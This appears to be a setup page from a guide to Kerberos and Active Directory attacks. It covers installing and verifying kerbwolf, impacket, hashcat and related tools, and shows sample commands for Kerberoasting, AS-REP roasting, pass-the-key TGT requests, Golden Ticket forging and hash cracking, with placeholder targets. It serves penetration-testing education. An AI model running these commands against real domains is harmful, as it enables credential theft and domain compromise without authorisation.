# Tools Setup

Installation and verification of the tools referenced throughout the Attacks section. All Python
tools are installed with [uv](https://docs.astral.sh/uv/) as isolated tool environments -- no
virtual environment management or `pip install` required.

---

## Quick Install

```bash title="Install kerbwolf, impacket, and CredWolf via uv"
uv tool install git+https://github.com/StrongWind1/KerbWolf
uv tool install git+https://github.com/fortra/impacket
uv tool install git+https://github.com/StrongWind1/CredWolf
```

---

## kerbwolf

[kerbwolf](https://github.com/StrongWind1/KerbWolf) is the primary toolkit for Kerberos roasting
and TGT operations used throughout this guide.

### Install

```bash
uv tool install git+https://github.com/StrongWind1/KerbWolf
```

### Tools

| Command | Purpose |
|---------|---------|
| `kw-roast` | Kerberoasting -- requests TGS-REP tickets and outputs hashcat-compatible hashes |
| `kw-asrep` | AS-REP roasting -- requests AS-REPs for no-preauth accounts |
| `kw-extract` | Offline pcap parser -- extracts AS-REQ, AS-REP, and TGS-REP hashes from captures |
| `kw-tgt` | TGT acquisition -- requests TGTs using passwords, NT hashes, or AES keys (pass-the-key) |

### Verify

```bash
kw-roast --help
kw-asrep --help
kw-extract --help
kw-tgt --help
```

### Basic Usage

```bash title="kerbwolf — Kerberoast, AS-REP roast, extract from pcap, and request TGT"
# Kerberoast all accounts with SPNs
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -p pass -o hashes.txt

# AS-REP roast using LDAP discovery
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -p pass --ldap -o hashes.txt

# Extract hashes from a pcap
kw-extract capture.pcapng -o hashes.txt

# Request a TGT using a password
kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -p pass

# Request a TGT using an NT hash (pass-the-key)
kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u user -H <NT_HASH>
```

---

## impacket

[impacket](https://github.com/fortra/impacket) provides the low-level Kerberos and AD tooling
used for ticket manipulation, delegation testing, and golden/silver ticket operations.

### Install

```bash
uv tool install git+https://github.com/fortra/impacket
```

### Key Tools

Impacket installs scripts as `<name>.py` (e.g., `getTGT.py`):

| Command | Purpose |
|---------|---------|
| `getTGT.py` | Request a TGT using a password, NT hash, or AES key |
| `getST.py` | Request a service ticket (supports S4U2Self and S4U2Proxy) |
| `describeTicket.py` | Decode and display the contents of a `.ccache` ticket file |
| `getPac.py` | Extract and display the PAC from a TGT |
| `ticketer.py` | Forge Golden and Silver tickets |
| `secretsdump.py` | Extract credentials from NTDS.dit or over DCSync |
| `findDelegation.py` | Enumerate delegation configurations in a domain |
| `addspn.py` | Add or remove SPNs from AD objects |
| `psexec.py` | Remote execution via SMB (for ticket testing) |
| `lookupsid.py` | Enumerate domain SIDs |

### Verify

```bash
getTGT.py --help
getST.py --help
ticketer.py --help
```

### Basic Usage

```bash title="impacket — get TGT, get service ticket, describe ticket, forge Golden Ticket"
# Get a TGT
getTGT.py CORP.LOCAL/user:pass -dc-ip 10.0.0.1

# Get a service ticket
export KRB5CCNAME=user.ccache
getST.py -spn HTTP/web.corp.local -k -no-pass CORP.LOCAL/user

# Describe a ticket
describeTicket.py user.ccache

# Forge a Golden Ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL administrator
```

!!! tip "Ticket files and `KRB5CCNAME`"
    Impacket tools write tickets to `.ccache` files and read from the path in the `KRB5CCNAME`
    environment variable. Always set `export KRB5CCNAME=<path>.ccache` before using `-k -no-pass`
    to authenticate with a saved ticket.

---

## hashcat

[hashcat](https://hashcat.net) is used to crack hashes extracted by kerbwolf or impacket.

### Install

=== "Linux (apt)"
    ```bash
    sudo apt install hashcat
    ```

=== "Linux (binary)"
    ```bash
    wget https://hashcat.net/files/hashcat-7.1.2.7z
    7z x hashcat-7.1.2.7z
    ./hashcat-7.1.2/hashcat --help
    ```

=== "macOS"
    ```bash
    brew install hashcat
    ```

### Hash Modes

**Kerberoasting** (`$krb5tgs$`)

| Etype | Mode | Example |
|-------|------|---------|
| RC4-HMAC (23) | 13100 | `hashcat -m 13100 hashes.txt wordlist.txt` |
| AES128 (17) | 19600 | `hashcat -m 19600 hashes.txt wordlist.txt` |
| AES256 (18) | 19700 | `hashcat -m 19700 hashes.txt wordlist.txt` |

**AS-REP Roasting** (`$krb5asrep$`)

| Etype | Mode | Example |
|-------|------|---------|
| RC4-HMAC (23) | 18200 | `hashcat -m 18200 hashes.txt wordlist.txt` |
| AES128 (17) | 32100 | `hashcat -m 32100 hashes.txt wordlist.txt` |
| AES256 (18) | 32200 | `hashcat -m 32200 hashes.txt wordlist.txt` |

**AS-REQ Roasting** (`$krb5pa$`, passive pre-auth capture)

| Etype | Mode | Example |
|-------|------|---------|
| RC4-HMAC (23) | 7500 | `hashcat -m 7500 hashes.txt wordlist.txt` |
| AES128 (17) | 19800 | `hashcat -m 19800 hashes.txt wordlist.txt` |
| AES256 (18) | 19900 | `hashcat -m 19900 hashes.txt wordlist.txt` |

```bash title="hashcat — wordlist + rules, then brute-force short passwords"
# Wordlist + rules (best starting point for all modes)
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule

# Brute-force short passwords
hashcat -m 13100 hashes.txt -a 3 ?a?a?a?a?a?a?a?a
```

---

## Other Tools

The following tools appear in specific attack pages but are not covered in detail here:

| Tool | Platform | Install | Used For |
|------|----------|---------|----------|
| [Rubeus](https://github.com/GhostPack/Rubeus) | Windows (.NET) | Compile or download release | Roasting, ticket injection, S4U chains |
| [mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows | Download release | Ticket export, DCSync, Golden/Silver tickets |
| [kerbrute](https://github.com/ropnop/kerbrute) | Cross-platform (Go) | Download binary | User enumeration, password spraying |
| [BloodHound](https://github.com/SpecterOps/BloodHound) | Cross-platform | See docs | Delegation path discovery, SPN enumeration |
| [krbrelayx](https://github.com/dirkjanm/krbrelayx) | Python | `uv tool install git+https://github.com/dirkjanm/krbrelayx` | SPN manipulation (`addspn.py`), unconstrained delegation abuse |

---

## CredWolf

[CredWolf](https://github.com/StrongWind1/CredWolf) is referenced in the
[Password Spraying](credential-theft/password-spraying.md) and
[User Enumeration](credential-theft/user-enumeration.md) pages for its detailed per-account
response classification (valid, disabled, expired, locked, ASREProastable). Installed as part
of the [Quick Install](#quick-install) block above.
